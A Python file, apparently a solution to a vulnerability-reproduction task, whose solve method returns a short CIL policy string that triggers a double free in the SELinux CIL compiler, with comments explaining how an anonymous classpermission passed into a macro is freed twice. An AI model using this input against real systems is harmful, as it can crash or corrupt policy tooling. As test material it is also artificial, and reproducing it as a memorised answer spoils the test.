class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # This CIL (Common Intermediate Language) code triggers a double free.
        #
        # 1. `(class c (p))`: Defines a simple class 'c' with a permission 'p'.
        #    This is a prerequisite for defining a classpermission.
        #
        # 2. `(macro m ((classpermission a)) (classpermissionset s (a)))`:
        #    Defines a macro 'm' that takes a `classpermission` argument 'a'.
        #    Inside the macro, a `classpermissionset` named 's' is created,
        #    which includes the passed-in classpermission 'a'.
        #
        # 3. `(call m ((classpermission (c (p)))))`: Calls the macro 'm'.
        #    The argument is an *anonymous* classpermission. This is the key.
        #
        # The vulnerability occurs because the CIL compiler creates an AST node
        # for the anonymous classpermission. This node is marked for destruction
        # after the `call` expression is processed. However, a reference to this
        # same node is also stored within the `classpermissionset` 's'. When the
        # entire AST is destroyed, the `classpermissionset` 's' is destroyed,
        # which in turn tries to destroy its member classpermissions, leading
        # to a second free of the same anonymous classpermission object.
        
        poc = b"(class c(p))(macro m((classpermission a))(classpermissionset s(a)))(call m((classpermission(c(p)))))"
        return poc
